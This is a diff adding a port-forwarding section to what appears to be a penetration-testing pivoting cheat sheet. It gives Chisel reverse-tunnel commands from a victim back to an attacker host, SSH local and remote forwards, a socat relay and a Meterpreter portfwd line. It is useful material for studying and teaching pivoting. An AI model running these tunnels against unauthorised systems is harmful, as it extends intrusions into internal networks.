@@ -109,3 +109,53 @@ $ sudo apt-get install sshuttle
 $ sudo sshuttle -r <user>@<IP-Victim1> <IP-Network1>/<subnet> -v 
 ````
 With this command, sshuttle creates an entry in our iptables to redirect all traffic to the <IP-Network1>/<subnet> network through the pivot host.
+
+# Port Forwarding
+
+The concept of “Port Forwarding” is the forwarding of ports, that is, when we receive a connection on a specific port, we forward that connection to another port on a specific host.
+
+## Chisel
+
+Attacker Machine
+````
+$ ./chisel server -p 8000 --reverse
+$ ./chisel server --reverse
+````
+Local PortForwarding (Victim Host)
+````
+> chisel client <IP-Attcker>:<Port> R:<PortForward_Attacker>:127.0.0.1:<PortForward_Victim>
+````
+Remote PortForwarding (Victim Host - Internal Network)
+````
+> chisel client <IP-Attcker>:<Port> R:<PortForward_Attacker>:<IP-InternalNetworkHost>:<PortForward_InternalNetworkHost>
+````
+
+## SSH
+
+Local Port Forwarding
+````
+$ ssh -N -L <IP-Interface(Optional):<Port-Attacker>:<IP-Victim>:<Port-Victim> <user>@<IP-Victim>
+$ ssh -N -L <Port-Attacker>:<IP-Victim>:<Port-Victim> <user>@<IP-Victim>
+$ ssh -L <IP-Interface(Optional):<Port-Attacker>:<IP-Victim>:<Port-Victim> <user>@<IP-Victim>
+$ ssh -L <Port-Attacker>:<IP-Victim>:<Port-Victim> <user>@<IP-Victim>
+$ ssh -L 1234:127.0.0.1:1234 <user>@<IP-Victim>
+$ ssh -L 1234:<IP-InternalNetworkHost>:1234 <user>@<IP-Victim>
+````
+Remote Port Forwarding
+````
+$ ssh -N -R <IP-VictimSSH>:<Port-VictimSSH>:<IP-InternalNetworkHost>:<Port-Victim> <user>@<IP-Victim>
+$ ssh -N -R 192.168.67.1:4445:192.168.67.128:445 user@192.168.67.1
+````
+The -N can be omitted, as it doesn't enable ssh command execution, it's there to be useful when forwarding ports.
+
+## Socat
+````
+$ socat TCP-LISTEN:[victim_port],fork,reuseaddr TCP:[redirect_ip]:[exposed_port]
+````
+
+## Metasploit
+
+In this case, you need the meterpreter shell
+````
+portfwd add –l <local_port_attacker> –p <port_victim> –r <target_host>
+````
